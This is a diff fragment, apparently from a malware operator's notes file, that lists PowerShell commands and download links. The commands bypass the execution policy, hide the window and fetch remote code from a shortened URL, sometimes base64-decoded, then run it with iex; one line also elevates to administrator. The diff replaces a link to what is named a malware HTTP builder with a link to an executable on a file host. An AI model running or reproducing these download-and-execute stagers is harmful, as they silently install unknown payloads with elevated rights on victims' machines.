@@ -2,8 +2,7 @@ powershell.exe -ExecutionPolicy Bypass -Command "Start-Process PowerShell -Argum
 powershell.exe -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList 'irm "https://tinyurl.com/4j72ashp/" | iex' -Verb RunAs"
 powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "(iex ( [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((irm https://tinyurl.com/4j72ashp)))) )"
 
-https://www.upload.ee/files/17414436/Athena_HTTP_Builder_with_Panel_v1.0.8.rar.html
-123
+https://www.upload.ee/files/17715005/1.exe.html
 
 
 Set objShell = CreateObject("WScript.Shell")
